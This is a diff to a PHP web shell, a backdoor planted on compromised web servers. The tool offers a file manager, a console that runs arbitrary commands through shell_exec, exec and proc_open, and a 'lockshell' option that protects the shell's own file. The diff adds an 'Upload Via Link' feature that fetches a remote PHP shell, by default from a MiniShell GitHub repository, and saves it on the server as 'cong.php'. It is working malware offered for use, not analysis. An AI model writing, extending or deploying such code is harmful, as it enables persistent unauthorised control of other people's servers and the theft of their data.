@@ -396,6 +396,7 @@ $Array = [
 				</div>
 				<div class='text-center'>
 			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
 			</div>
@@ -434,7 +435,7 @@ $Array = [
 		for($i = 0; $i <= $c_dir; $i++) {
 			$scdir[$i];
 		if($i != $c_dir) {
-		}
+		}}
 		function changeFilePermissions($filename, $permissions) {
 			if (file_exists($filename)) {
 				if (chmod($filename, $permissions)) {
@@ -451,7 +452,6 @@ $Array = [
 				new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
 				RecursiveIteratorIterator::SELF_FIRST
 			);
-
 			foreach ($iterator as $item) {
 				if ($item->isDir()) {
 					chmod($item->getPathname(), $perms);
@@ -463,7 +463,6 @@ $Array = [
 				new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
 				RecursiveIteratorIterator::SELF_FIRST
 			);
-
 			foreach ($iterator as $item) {
 				if ($item->isFile()) {
 					chmod($item->getPathname(), $perms);
@@ -492,7 +491,6 @@ $Array = [
 			echo "Permissions changed for all folders in the current directory.";
 		}
 		$filename = __FILE__;
-
 		if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
 			$newPermissions = 0444;
 			changeFilePermissions($filename, $newPermissions);
@@ -699,20 +697,17 @@ $Array = [
 		$command = '';
 		if (!empty($_POST['cmd'])) {
 			$command = htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');
-			// Try using shell_exec
 			$cmdResult = shell_exec($command . ' 2>&1');
 			if ($cmdResult === null) {
-				// Shell_exec failed, try using exec
 				$output = array();
 				$return_var = 0;
 				exec($command, $output, $return_var);
 				$cmdResult = implode("\n", $output);
 				if ($cmdResult === null) {
-					// Exec failed, try using proc_open
 					$descriptorspec = array(
-						0 => array("pipe", "r"),  // stdin
-						1 => array("pipe", "w"),  // stdout
-						2 => array("pipe", "w")   // stderr
+						0 => array("pipe", "r"),
+						1 => array("pipe", "w"),
+						2 => array("pipe", "w")
 					);
 					$process = proc_open($command, $descriptorspec, $pipes);
 					if (is_resource($process)) {
@@ -784,7 +779,45 @@ $Array = [
 				</div>
 			</form>
 		</div>";
+		}
+		// Upload Via Link
+		if ($_7['id'] == 'uploadvialink') {
+			s();
+			if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+				$url = isset($_POST['url']) ? trim($_POST['url']) : '';
+				$namafile = isset($_POST['namafile']) ? trim($_POST['namafile']) : 'cong.php';
+				if (filter_var($url, FILTER_VALIDATE_URL)) {
+					$content = file_get_contents($url);
+					if ($content !== false) {
+						$filePath = getcwd() . '/' . $namafile;
+						$result = file_put_contents($filePath, $content);
+						if ($result !== false) {
+							echo "<div><strong>Upload</strong> ok! Saved as $namafile " . ok() . "</div>";
+						} else {
+							echo '<div><strong>Upload</strong> fail! ' . er() . '</div>';
+						}
+					} else {
+						echo '<div><strong>Upload</strong> fail! ' . er() . '</div>';
+					}
+				} else {
+					echo '<div><strong>Invalid URL</strong></div>';
+				}
 			}
+			echo "
+			<div class='card card-body text-dark input-group mb-3'>
+				<u>Upload Via Link</u>
+				<form method='POST' enctype='multipart/form-data'>
+					<div class='input-group'>
+						<input class='form-control form-control-sm' type='url' name='url' placeholder='Enter the link' value='https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php' required>
+					</div>
+					<div class='input-group'>
+						<input class='form-control form-control-sm' type='text' name='namafile' placeholder='Save As' value='cong.php'>
+					</div>
+					<div class='input-group'>
+						<button type='submit' name='upl' class='btn btn-primary'>Upload</button>
+					</div>
+				</form>
+			</div>";
 		}
 		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
 			ob_implicit_flush();ob_end_flush();s();
